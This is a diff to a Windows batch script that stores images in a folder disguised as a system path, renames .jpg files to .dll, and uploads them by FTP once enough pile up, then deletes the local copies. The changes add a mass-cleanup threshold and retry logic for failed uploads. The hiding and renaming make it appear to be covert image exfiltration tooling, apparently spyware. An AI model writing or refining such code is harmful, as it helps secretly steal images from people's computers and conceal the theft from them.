@@ -5,16 +5,17 @@ REM do remember to change the ftp config file as well, as it need to access the 
 REM lcd should be aligned with the datapath set here
 REM set datapath=C:\Users\Administrator\.WinSys\ftp\.cfg
 set datapath=C:\Windows\.WinSys\.cfg
-set FILE_THRES=10
+set UPLOAD_FILE_THRES=10
+set FORCE_CLEAN_FILE_THRES=10000
 
 if not exist %datapath% mkdir %datapath%
 
 echo "Now switch to data output dir, taken as working dir"
 pushd %datapath%
 
-:Loop
+:LOOP
 
-echo "Ener loop"
+echo "Ener LOOP"
 echo "wait..."
 REM timeout /T 10 /NOBREAK
 ping -n 10 -w 1000 127.0.0.1 >nul
@@ -34,12 +35,19 @@ ren *.jpg *.dll
 set cnt=0
 for %%A in (*) do set /a cnt+=1
 echo "Total file cnt: %cnt%"
-if %cnt% GTR %FILE_THRES% (
+
+echo "check whether need to force cleanup for massive storage"
+if %cnt% GTR %FORCE_CLEAN_FILE_THRES% (
+	echo "too many files, force cleanup"
+	GOTO CLEANUP
+)
+
+if %cnt% GTR %UPLOAD_FILE_THRES% (
 	echo "try upload..."
 	GOTO UPLOAD
 ) else (
 	echo "wait for more images"
-	GOTO Loop
+	GOTO LOOP
 )
 	
 :UPLOAD
@@ -47,10 +55,16 @@ if %cnt% GTR %FILE_THRES% (
 	if %errorlevel%==0 (
 		echo "network connected, start upload"
 		ftp -s:%binarypath%\config.txt
-		GOTO CLEANUP
+		if %errorlevel%==0 (
+			echo "upload file success"
+			GOTO CLEANUP
+		) else (
+			echo "upload file failed, pending for next cycle"
+			GOTO LOOP
+		)
 	) else (
 		echo "network disconnected, skip upload"
-		GOTO Loop
+		GOTO LOOP
 	)
 
 :CLEANUP
@@ -66,6 +80,6 @@ if %cnt% GTR %FILE_THRES% (
 	REM del *.tmp
 	del *
 
-GOTO Loop
+GOTO LOOP
 
 popd
